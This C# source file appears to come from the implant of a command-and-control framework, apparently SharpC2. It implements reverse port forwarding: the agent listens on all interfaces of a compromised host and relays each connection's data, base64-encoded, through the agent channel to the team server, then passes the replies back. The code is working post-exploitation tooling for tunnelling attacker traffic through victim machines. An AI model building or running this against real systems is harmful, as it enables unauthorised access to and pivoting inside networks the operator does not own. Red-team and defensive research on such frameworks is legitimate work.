using System;
using System.Net;
using System.Text;
using System.Linq;
using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;

using Agent.Models;
using Agent.Common;
using Agent.Controllers;

namespace Agent.Commands
{
    internal class PortFwd
    {
        protected static AgentController Agent;
        protected static List<ReversePortForward> ReversePortForwards = new List<ReversePortForward>();
        protected static Dictionary<string, byte[]> Data = new Dictionary<string, byte[]>();

        internal PortFwd(AgentController agent)
        {
            Agent = agent;
        }

        internal static string NewReversePortForward(string data)
        {
            var split = data.Split(' ');
            var bindAddress = IPAddress.Parse("0.0.0.0");
            var bindPort = Convert.ToInt32(split[0]);
            var fwdAddress = IPAddress.Parse(split[1]);
            var fwdPort = Convert.ToInt32(split[2]);

            var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            socket.Bind(new IPEndPoint(bindAddress, bindPort));
            socket.Listen(20);

            var rPortFwd = new ReversePortForward
            {
                BindAddress = bindAddress,
                BindPort = bindPort,
                ForwardAddress = fwdAddress,
                ForwardPort = fwdPort,
                Socket = socket
            };
            ReversePortForwards.Add(rPortFwd);

            var t = new Thread(delegate (object param)
            {
                while (true)
                {
                    try
                    {
                        var clientSocket = socket.Accept();
                        SocketHandler(clientSocket as Socket, rPortFwd);
                    }
                    catch { }
                }
            });

            t.Start(socket);

            return ShowReversePortForwwrds();
        }

        internal static string StopReversePortForward(string data)
        {
            var bindPort = int.Parse(data);
            var rPortFwd = ReversePortForwards.Where(r => r.BindPort == bindPort).FirstOrDefault();
            try { rPortFwd.Socket.Shutdown(SocketShutdown.Both); } catch { rPortFwd.Socket.Close(); }
            ReversePortForwards.Remove(rPortFwd);
            return ShowReversePortForwwrds();
        }

        internal static string FlushReversePortForwards()
        {
            foreach (var rPortFwd in ReversePortForwards)
            {
                try { rPortFwd.Socket.Shutdown(SocketShutdown.Both); } catch { rPortFwd.Socket.Close(); }
            }

            ReversePortForwards.Clear();
            return ShowReversePortForwwrds();
        }

        internal static string ShowReversePortForwwrds()
        {
            var results = new SharpC2ResultList<ReversePortForwardResult>();

            foreach (var rPortFwd in ReversePortForwards)
            {
                results.Add(new ReversePortForwardResult
                {
                    BindAddress = rPortFwd.BindAddress.ToString(),
                    BindPort = rPortFwd.BindPort,
                    ForwardAddress = rPortFwd.ForwardAddress.ToString(),
                    ForwardPort = rPortFwd.ForwardPort
                });
            }

            return results.ToString();
        }

        private static void SocketHandler(Socket socket, ReversePortForward rPortFwd)
        {
            var recv = new Thread(delegate (object param)
            {
                var client = (Socket)param;
                var data = new byte[1024];

                try
                {
                    client.Receive(data);

                    var chunkId = Helpers.GenerateRandomString(8);
                    var package = string.Format("{0}|{1}|{2}|{3}",
                        chunkId,
                        rPortFwd.ForwardAddress.ToString(),
                        rPortFwd.ForwardPort,
                        Convert.ToBase64String(data));

                    Agent.SendModuleData("ReversePortForward", "DataFromAgent", package);

                    while (true)
                    {
                        if (Data.ContainsKey(chunkId))
                        {
                            client.Send(Data[chunkId]);
                            client.Close();
                            Data.Remove(chunkId);
                            break;
                        }
                    }
                }
                catch { }
            });

            recv.Start(socket);
        }

        internal static void QueueDataFromTeamServer(string data)
        {
            var split = data.Split('|');
            Data.Add(split[0], Encoding.UTF8.GetBytes(split[1]));
        }
    }
}